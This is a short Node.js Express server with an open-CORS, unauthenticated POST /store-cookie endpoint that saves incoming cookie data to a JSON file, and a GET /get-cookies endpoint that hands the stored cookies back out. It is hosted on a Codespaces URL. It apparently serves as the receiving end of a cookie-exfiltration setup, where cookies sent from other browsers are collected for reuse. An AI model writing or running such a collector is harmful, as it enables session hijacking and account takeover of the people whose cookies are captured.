const express = require("express");
const cors = require("cors");  
const fs = require("fs");
const app = express();
const PORT = 3000;

app.use(cors({
    origin: "*"  
}));

app.use(express.json());

app.post("/store-cookie", (req, res) => {
    try {
        const { cookies } = req.body;

        if (!cookies) {
            return res.status(400).json({ error: "No cookies received" });
        }

        // Read the existing data with error handling
        let storedData = [];
        if (fs.existsSync("cookie_data.json")) {
            const fileContent = fs.readFileSync("cookie_data.json", 'utf8');
            // Log the content to debug
            console.log('File content:', fileContent);
            
            try {
                storedData = JSON.parse(fileContent);
                // Ensure storedData is an array
                if (!Array.isArray(storedData)) {
                    console.log('Stored data is not an array:', storedData);
                    storedData = [];
                }
            } catch (parseError) {
                console.error('Error parsing JSON:', parseError);
                storedData = [];
            }
        }

        // Add new cookie data
        const newEntry = { 
            cookies, 
            timestamp: new Date().toISOString() 
        };
        storedData.push(newEntry);

        // Write with proper formatting
        fs.writeFileSync(
            "cookie_data.json", 
            JSON.stringify(storedData, null, 2),
            'utf8'
        );

        res.json({ 
            message: "Cookies stored successfully",
            entriesCount: storedData.length
        });

    } catch (error) {
        console.error('Error in /store-cookie:', error);
        res.status(500).json({ 
            error: "Internal server error",
            details: error.message
        });
    }
});

app.get("/get-cookies", (req, res) => {
    try {
        if (fs.existsSync("cookie_data.json")) {
            const fileContent = fs.readFileSync("cookie_data.json", 'utf8');
            const data = JSON.parse(fileContent);
        
            if (!Array.isArray(data) || data.length === 0) {
                return res.json({});
            }
        
            res.json(data[0]);
        } else {
            res.json({});
        }
    } catch (error) {
        console.error('Error in /get-cookies:', error);
        res.status(500).json({ 
            error: "Internal server error",
            details: error.message
        });
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on https://cuddly-halibut-6xp55wwxr96cxrr6-3000.app.github.dev/`);
});